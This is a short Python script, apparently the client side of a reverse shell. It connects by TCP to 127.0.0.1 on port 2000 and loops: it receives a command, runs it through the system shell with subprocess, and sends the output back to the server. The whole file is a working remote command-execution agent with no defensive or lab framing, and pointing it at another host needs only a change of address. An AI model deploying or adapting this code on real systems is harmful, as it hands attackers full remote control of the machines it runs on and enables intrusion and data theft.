import socket
import subprocess

def execute_command(command):
    """Execute a system command and return its output or error."""
    try:
        # Run the command and capture output
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else ""
        error = result.stderr if result.stderr else ""
        return output + error
    except Exception as e:
        return f"Error: {str(e)}"

def main():
    # Create a TCP client socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the server
        client_socket.connect(("127.0.0.1", 2000))
        print("Connected to server at 127.0.0.1:2000")

        while True:
            # Receive the command from the server
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                print("No command received or server disconnected.")
                break
            print(f"Received command: {command}")

            # Execute the command
            result = execute_command(command)
            print(f"Command output: {result}")

            # Send the result back to the server
            client_socket.send(result.encode('utf-8'))
            print("Result sent to server.")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Close the client socket
        client_socket.close()
        print("Client socket closed.")

if __name__ == "__main__":
    main()